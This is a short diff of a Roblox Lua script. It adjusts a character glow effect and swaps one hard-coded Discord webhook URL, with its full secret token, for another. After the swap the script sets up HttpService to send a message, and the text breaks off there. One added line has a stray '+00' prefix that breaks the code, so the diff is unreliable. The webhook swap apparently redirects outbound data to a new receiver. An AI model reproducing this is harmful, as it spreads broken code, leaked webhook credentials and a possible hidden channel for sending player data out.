@@ -9,7 +9,7 @@ local function illuminateTarget(targetCharacter, duration, color, intensity)
       if effectTime < duration then
         local transparencyMod = math.sin(effectTime * math.pi / duration) * intensity
         targetRootPart.Transparency = 1 - transparencyMod
-        targetRootPart.Material.Diffuse = color * transparencyMod
+00        targetRootPart.Material.Diffuse = color * transparencyMod
         task.delay(0.01, updateTime)
       else
         targetRootPart.Transparency = originalTransparency
@@ -62,7 +62,7 @@ game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
     end
   end)
 end)
-webhook = "https://discord.com/api/webhooks/1249305406291972146/LOVuQhaBmqj_h93bt-qAgPyUQjb-zlgBlPPb-rKzjPCdrY_fzrYaKTu4_HuUWh_537wd"
+webhook = "https://discord.com/api/webhooks/1254338103028482098/fKxdIppEAKWlLiYOcWIZxfXsq90nGfuvCrnrYVgI2Y8SEvGjgYwIfiT7ZSv3pKzM8wFH"
 
 local http = game:GetService("HttpService")
 local message = {
